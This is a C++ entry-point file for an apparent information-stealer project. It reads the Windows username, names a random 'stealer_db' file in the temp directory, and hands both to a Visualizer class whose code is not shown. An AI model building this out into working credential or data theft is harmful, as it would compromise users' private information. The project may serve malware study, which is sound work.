/*
 * © 2024 Shayan Ahmed Khan - shaddy43
 *
 * This software is provided under the MIT License.
 * Permission is hereby granted, free of charge, to any person obtaining a copy of this software
 * and associated documentation files (the "Software"), to deal in the Software without restriction,
 * including without limitation the rights to use, copy, modify, merge, publish, distribute,
 * sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all copies or
 * substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING
 * BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
 * NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,
 * DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */

#define _CRT_SECURE_NO_WARNINGS
#define _SILENCE_ALL_CXX17_DEPRECATION_WARNINGS

#include "includes/Visualizer.h"
std::string stealer_db;

void init_stealer_db()
{
	std::string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

	srand(time(0)); // Seed the random number generator with current time
	for (int i = 0; i < 6; ++i) {
		stealer_db += characters[rand() % characters.length()];
	}

	std::filesystem::path temp_path = std::filesystem::temp_directory_path();
	stealer_db = temp_path.string() + stealer_db;
}

int main(int argc, char* argv[])
{
	std::string converted_username;
	wchar_t username[MAX_PATH];
	DWORD size = MAX_PATH;
	if (GetUserName(username, &size))
	{
		std::wstring_convert <std::codecvt_utf8<wchar_t>> converter;
		converted_username = converter.to_bytes(username);
	}

	init_stealer_db();
	Visualizer visualizer(converted_username, stealer_db);

	if (argc > 1)
	{
		if (std::string(argv[1]) == "--help")
		{
			//Visualize here
			visualizer.visualization_main();
		}
	}
	else
	{
		if (!visualizer.default_settings(converted_username, stealer_db))
			return -1;
	}
	return 0;
}